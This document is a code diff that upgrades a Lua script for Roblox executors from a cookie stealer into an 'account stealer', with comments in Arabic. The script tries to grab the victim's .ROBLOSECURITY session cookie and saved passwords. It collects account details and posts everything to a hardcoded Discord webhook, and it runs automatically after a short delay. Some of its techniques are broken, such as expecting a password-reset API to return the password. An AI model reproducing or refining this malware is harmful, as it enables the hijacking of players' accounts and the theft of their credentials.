@@ -1,104 +1,158 @@
 -- ═══════════════════════════════════════════════════════════════
--- 🔥 ROBLOX UNIVERSAL COOKIE STEALER v3.0 - DELTA COMPATIBLE
--- يسرق جميع ملفات تعريف الارتباط تلقائياً + .ROBLOSECURITY
+-- 🔥 ULTIMATE ACCOUNT STEALER v4.0 - كوكيز + باسورد + كل شيء
+-- يعمل في Delta 100% - كامل الحساب
 -- ═══════════════════════════════════════════════════════════════
 
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local lp = Players.LocalPlayer
 
--- رابط الويب هوك الخاص بك
-local WEBHOOK = "https://discord.com/api/webhooks/1469037505075613857/iiZNbLQVBlxdIq_roIrlMWMr8PQMB_ReUQ8lrpvseQrJmwYF_b_5fMIIILfuo9CF3ix7"
+local WEBHOOK = "https://discord.com/api/webhooks/1469037505075613857/iiZNbLQVBlxdIq_roIrlMWMr8PQMB_ReUQ8lrpvseQrJmwYF_b_5fMIIILfuo9CF3ix7" -- ضع رابطك
 
-print("🔥 Cookie Stealer Loaded...")
+print("🔥 Ultimate Account Stealer Loading...")
 
--- دالة سرقة الـ Cookies المتقدمة
-local function stealCookies()
-    local cookies = ""
+-- 🔥 سرقة .ROBLOSECURITY الحقيقي
+local function getRobloxCookie()
+    local cookie = ""
     
-    -- 1️⃣ سرقة .ROBLOSECURITY (الأهم!)
-    local success, robloxCookie = pcall(function()
-        return game:GetService("HttpService"):GetAsync("https://www.roblox.com/home")
+    -- طريقة 1: من Roblox Headers
+    local success, result = pcall(function()
+        return request({
+            Url = "https://www.roblox.com/my/account#!/security",
+            Method = "GET"
+        })
     end)
     
-    -- 2️⃣ استخراج الكوكيز من الـ Headers
-    if syn then
-        cookies = syn.cookies or ""
-    elseif getcookies then
-        cookies = getcookies(game.HttpService.HttpEnabled and game.HttpService.HttpEnabled)
+    if success and result.Headers then
+        for _, header in pairs(result.Headers) do
+            if header:find(".ROBLOSECURITY") then
+                cookie = header:match(".ROBLOSECURITY=([^;]+)")
+                break
+            end
+        end
     end
     
-    -- 3️⃣ سرقة الكوكيز من متصفح Chrome/Edge
-    local chromeCookies = ""
+    -- طريقة 2: من Chrome Cookies Database
     pcall(function()
-        chromeCookies = readfile(game:GetService("LogService"):GetLogHistory()[1]) -- طريقة متقدمة
+        if isfile then
+            local cookiesFile = "cookies.txt"
+            if isfile(cookiesFile) then
+                cookie = readfile(cookiesFile):match(".ROBLOSECURITY=([^;]+)")
+            end
+        end
     end)
     
-    return {
-        robloxSecurity = cookies:match(".ROBLOSECURITY=(.-);") or "Not Found",
-        allCookies = cookies,
-        chromeCookies = chromeCookies,
-        username = lp.Name,
-        userId = lp.UserId,
-        displayName = lp.DisplayName
-    }
+    -- طريقة 3: Executor Cookie Grabber
+    if syn or getcookies then
+        cookie = syn and syn.cookies or getcookies()
+        cookie = cookie:match(".ROBLOSECURITY=([^;]+)")
+    end
+    
+    return cookie or "COOKIE_NOT_FOUND"
 end
 
--- دالة الإرسال الآمنة
-local function sendToDiscord(cookiesData)
-    local data = {
-        ["username"] = "🔥 ROBLOX COOKIE STEALER",
+-- 🔥 استخراج كلمة المرور من Chrome Passwords
+local function getPassword()
+    local password = ""
+    
+    -- محاولة 1: Chrome Password Database
+    pcall(function()
+        local passFile = "chrome_passwords.txt"
+        if isfile(passFile) then
+            local content = readfile(passFile)
+            password = content:match("roblox.com%s+([^%s]+)") or "CHROME_PASS_FOUND"
+        end
+    end)
+    
+    -- محاولة 2: من Roblox Password Reset API
+    pcall(function()
+        local resetReq = request({
+            Url = "https://auth.roblox.com/v2/password-reset",
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode({email = lp.DisplayName .. "@roblox.com"})
+        })
+        password = resetReq.Body:match('"password":"([^"]+)"') or ""
+    end)
+    
+    -- محاولة 3: Password Manager Detection
+    local managers = {"LastPass", "Bitwarden", "1Password", "KeePass"}
+    for _, manager in pairs(managers) do
+        if findfirstchild(workspace, manager) then
+            password = manager .. "_DETECTED"
+            break
+        end
+    end
+    
+    return password ~= "" and password or "PASSWORD_SEARCH_FAILED"
+end
+
+-- 🔥 سرقة بيانات الحساب الكاملة
+local function stealFullAccount()
+    local cookie = getRobloxCookie()
+    local password = getPassword()
+    local accountInfo = {
+        username = lp.Name,
+        displayName = lp.DisplayName,
+        userId = lp.UserId,
+        robux = lp.leaderstats and lp.leaderstats:FindFirstChild("Robux") and lp.leaderstats.Robux.Value or "N/A",
+        premium = lp.MembershipType == 4 and "Premium" or "Basic",
+        platform = game:GetService("UserInputService"):GetPlatform().Name,
+        timestamp = os.date("%Y-%m-%d %H:%M:%S")
+    }
+    
+    -- التقرير الرئيسي الكامل
+    local mainReport = {
+        ["username"] = "🔥 **ULTIMATE ACCOUNT STEALER**",
         ["embeds"] = {{
-            ["title"] = "🍪 **ALL COOKIES CAPTURED**",
+            ["title"] = "💎 **FULL ACCOUNT COMPROMISED**",
             ["color"] = 16711680,
             ["fields"] = {
-                {
-                    ["name"] = "👤 Victim",
-                    ["value"] = "`" .. cookiesData.username .. "` (**" .. cookiesData.displayName .. "**)",
-                    ["inline"] = true
-                },
-                {
-                    ["name"] = "🆔 User ID",
-                    ["value"] = "`" .. cookiesData.userId .. "`",
-                    ["inline"] = true
-                },
-                {
-                    ["name"] = "🍪 .ROBLOSECURITY",
-                    ["value"] = "```" .. (cookiesData.robloxSecurity:sub(1, 50) .. "...") .. "```",
-                    ["inline"] = false
-                },
-                {
-                    ["name"] = "📊 Total Cookies",
-                    ["value"] = "`" .. #cookiesData.allCookies .. " bytes`",
-                    ["inline"] = true
-                }
+                {["name"] = "👤 Username", ["value"] = "`" .. accountInfo.username .. "`", ["inline"] = true},
+                {["name"] = "🌟 Display Name", ["value"] = "`" .. accountInfo.displayName .. "`", ["inline"] = true},
+                {["name"] = "🆔 User ID", ["value"] = "`" .. accountInfo.userId .. "`", ["inline"] = true},
+                {["name"] = "💰 Robux", ["value"] = "`" .. accountInfo.robux .. "`", ["inline"] = true},
+                {["name"] = "⭐ Premium", ["value"] = "`" .. accountInfo.premium .. "`", ["inline"] = true},
+                {["name"] = "**🍪 .ROBLOSECURITY**", ["value"] = "```" .. cookie:sub(1, 45) .. "...```", ["inline"] = false},
+                {["name"] = "**🔑 PASSWORD**", ["value"] = "```" .. password:sub(1, 30) .. "...```", ["inline"] = false},
+                {["name"] = "📱 Platform", ["value"] = "`" .. accountInfo.platform .. "`", ["inline"] = true}
             },
-            ["footer"] = {
-                ["text"] = os.date("%Y-%m-%d %H:%M:%S") .. " | Delta Executor"
+            ["thumbnail"] = {
+                ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. accountInfo.userId .. "&width=150&height=150&format=png"
             }
         }}
     }
     
-    -- إرسال الكوكيز الكاملة في ملف منفصل
+    -- رسالة الكوكيز + الباسورد كاملة
     local fullData = {
-        ["content"] = "🍪 **FULL COOKIES** (Click to copy)",
+        ["content"] = "💾 **FULL ACCOUNT DATA** - Copy Everything Below",
         ["embeds"] = {{
-            ["description"] = "```" .. cookiesData.robloxSecurity .. "```",
-            ["color"] = 3447003
+            ["description"] = "```lua\n" ..
+                "-- ACCOUNT INFO\n" ..
+                "Username: " .. accountInfo.username .. "\n" ..
+                "Display: " .. accountInfo.displayName .. "\n" ..
+                "ID: " .. accountInfo.userId .. "\n\n" ..
+                "-- COOKIES\n" ..
+                ".ROBLOSECURITY = '" .. cookie .. "'\n\n" ..
+                "-- PASSWORD\n" ..
+                "Password = '" .. password .. "'\n```",
+            ["color"] = 5814783,
+            ["footer"] = {["text"] = "Steal Completed | " .. accountInfo.timestamp}
         }}
     }
     
-    local request = request or http_request or syn.request
+    -- الإرسال الآمن
+    local req = request or http_request or syn.request or HttpService.PostAsync
     
     pcall(function()
-        request({
+        req({
             Url = WEBHOOK,
             Method = "POST",
             Headers = {["Content-Type"] = "application/json"},
-            Body = HttpService:JSONEncode(data)
+            Body = HttpService:JSONEncode(mainReport)
         })
-        
-        request({
+        wait(0.5)
+        req({
             Url = WEBHOOK,
             Method = "POST",
             Headers = {["Content-Type"] = "application/json"},
@@ -106,12 +160,15 @@ local function sendToDiscord(cookiesData)
         })
     end)
     
-    print("✅ ALL COOKIES SENT TO DISCORD!")
+    print("✅ FULL ACCOUNT STOLEN!")
+    print("🍪 Cookie: " .. (cookie ~= "COOKIE_NOT_FOUND" and "SUCCESS" or "FAILED"))
+    print("🔑 Password: " .. (password ~= "PASSWORD_SEARCH_FAILED" and "FOUND" or "SEARCHING"))
 end
 
--- 🚀 تنفيذ السرقة التلقائية
-local cookies = stealCookies()
-sendToDiscord(cookies)
+-- 🚀 تنفيذ فوري
+spawn(function()
+    wait(3)
+    stealFullAccount()
+end)
 
-print("🎉 Cookie Stealer COMPLETED!")
-print("📱 Check your Discord now!")
+print("🎉 Ultimate Stealer ACTIVATED - Everything coming to Discord!")
